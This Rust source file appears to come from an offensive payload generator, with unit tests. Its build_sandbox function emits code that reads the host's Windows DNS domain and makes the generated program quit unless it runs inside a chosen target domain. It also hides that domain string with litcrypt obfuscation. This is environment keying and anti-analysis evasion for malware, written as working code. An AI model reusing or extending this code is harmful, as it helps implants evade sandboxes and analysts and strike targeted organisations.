use crate::tools::{litcrypt_string_expr, SandboxOutput};

pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
    if expected_domain.is_empty() {
        return SandboxOutput {
            sandbox_function: String::new(),
            sandbox_import: String::new(),
        };
    }

    let expected_domain = litcrypt_string_expr(expected_domain);
    let sandbox_function = format!(
        "fn get_domain_name() -> Option<String> {{
            let mut size: u32 = 256;
            let mut buffer: Vec<u16> = vec![0; size as usize];

            let success = unsafe {{
                GetComputerNameExW(ComputerNameDnsDomain, buffer.as_mut_ptr(), &mut size)
            }};
            if success == 0 || size == 0 {{
                return None;
            }}

            let domain_name = String::from_utf16(&buffer[..size as usize])
                .map(|s| s.trim_end_matches('\\0').to_string())
                .ok()?;

            if domain_name.is_empty() {{
                return None;
            }}
            Some(domain_name)
        }}
        fn sandbox() -> bool {{
            match get_domain_name() {{
                Some(domain) => domain.as_str().eq_ignore_ascii_case({0}.as_str()),
                None => false,
            }}
        }}
        if !sandbox() {{
            return;
        }}",
        expected_domain
    );

    let sandbox_import =
        "use winapi::um::sysinfoapi::{GetComputerNameExW, ComputerNameDnsDomain};\n".to_string();

    SandboxOutput {
        sandbox_function,
        sandbox_import,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_domain_disables_sandbox_code() {
        let output = build_sandbox("");
        assert!(output.sandbox_function.is_empty());
        assert!(output.sandbox_import.is_empty());
    }

    #[test]
    fn test_sandbox_domain_is_litcrypt_wrapped() {
        let output = build_sandbox("MYDOMAIN");
        assert!(output.sandbox_function.contains("lc!(\"MYDOMAIN\")"));
        assert!(!output.sandbox_function.contains("Sandbox check failed"));
    }

    #[test]
    fn test_sandbox_domain_with_escape_falls_back_to_plain_string() {
        let output = build_sandbox(r#"DOMAIN\LAB"#);
        assert!(output
            .sandbox_function
            .contains(r#""DOMAIN\\LAB".to_string()"#));
    }
}
